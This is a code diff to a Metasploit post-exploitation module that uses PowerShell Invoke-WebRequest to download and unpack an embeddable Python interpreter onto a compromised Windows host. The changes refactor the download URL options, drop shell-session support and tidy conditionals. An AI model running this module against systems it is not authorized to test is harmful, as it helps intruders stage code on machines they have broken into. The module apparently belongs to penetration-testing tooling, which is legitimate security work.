@@ -12,7 +12,7 @@ class MetasploitModule < Msf::Post
     super(update_info(info,
                       'Name'          => 'Install Python for Windows',
                       'Description'   => '
-                        This module places an embeddable Python3 interpreter onto the target file system,
+                        This module places an embeddable Python3 distribution onto the target file system,
                         granting pentesters access to a lightweight Python interpreter.
                         This module does not require administrative privileges or user interaction with
                         installation prompts.
@@ -21,14 +21,15 @@ class MetasploitModule < Msf::Post
                       'Author'        => ['Michael Long <bluesentinel[at]protonmail.com>'],
                       'Arch' => [ARCH_X86, ARCH_X64],
                       'Platform'      => [ 'win' ],
-                      'SessionTypes'  => [ 'meterpreter', 'shell' ],
+                      'SessionTypes'  => [ 'meterpreter'],
                       'References'	=> [
                         ['URL', 'https://docs.python.org/3/using/windows.html#windows-embeddable'],
                         ['URL', 'https://attack.mitre.org/techniques/T1064/']
                       ]))
     register_options(
       [
-        OptString.new('PYTHON_URL', [true, 'Python embeddable zip URL', 'https://www.python.org/ftp/python/3.8.2/python-3.8.2-embed-win32.zip']),
+        OptString.new('PYTHON_VERSION', [true, 'Python version to download', '3.8.2']),
+        OptString.new('PYTHON_URL', [true, 'URL to Python distributions', 'https://www.python.org/ftp/python/']),
         OptString.new('FILE_PATH', [true, 'File path to store the python zip file; current directory by default', '.\\python-3.8.2-embed-win32.zip']),
         OptBool.new('CLEANUP', [false, 'Remove module artifacts; set to true when ready to cleanup', false])
       ]
@@ -36,12 +37,13 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    python_folder_path = File.basename(datastore['FILE_PATH'].to_s, File.extname(datastore['FILE_PATH'].to_s))
+    python_folder_path = File.basename(datastore['FILE_PATH'], File.extname(datastore['FILE_PATH']))
     python_exe_path = python_folder_path + "\\python.exe"
+    python_url = datastore['PYTHON_URL'] + datastore['PYTHON_VERSION'] + "/python-" + datastore['PYTHON_VERSION'] + "-embed-win32.zip"
 
     # check if PowerShell is available
     psh_path = "\\WindowsPowerShell\\v1.0\\powershell.exe"
-    if !file? "%WINDIR%\\System32#{psh_path}"
+    unless file? "%WINDIR%\\System32#{psh_path}"
       fail_with(Failure::NotVulnerable, "No powershell available.")
     end
 
@@ -56,12 +58,12 @@ class MetasploitModule < Msf::Post
     end
 
     # download python embeddable zip file
-    script = "Invoke-WebRequest -Uri #{datastore['PYTHON_URL']} -OutFile #{datastore['FILE_PATH']}; "
-    print_status("Downloading Python embeddable zip from #{datastore['PYTHON_URL']}")
+    script = "Invoke-WebRequest -Uri #{python_url} -OutFile #{datastore['FILE_PATH']}; "
+    print_status("Downloading Python embeddable zip from #{python_url}")
     psh_exec(script)
 
     # confirm python zip file is present
-    if !file? datastore['FILE_PATH'].to_s
+    unless file? datastore['FILE_PATH']
       fail_with(Failure::NotFound, "Failed to download #{datastore['PYTHON_URL']}")
     end
 
@@ -71,7 +73,7 @@ class MetasploitModule < Msf::Post
     psh_exec(script)
 
     # confirm python.exe is present
-    if !file? python_exe_path
+    unless file? python_exe_path
       fail_with(Failure::NotFound, python_exe_path)
     end
 
@@ -79,6 +81,5 @@ class MetasploitModule < Msf::Post
     print_status("Ready to execute Python; spawn a command shell and enter:")
     print_good("#{python_exe_path} -c \"print('Hello, world!')\"")
     print_warning("Avoid using this python.exe interactively, as it will likely hang your terminal; use script files or 1 liners instead")
-
   end
 end
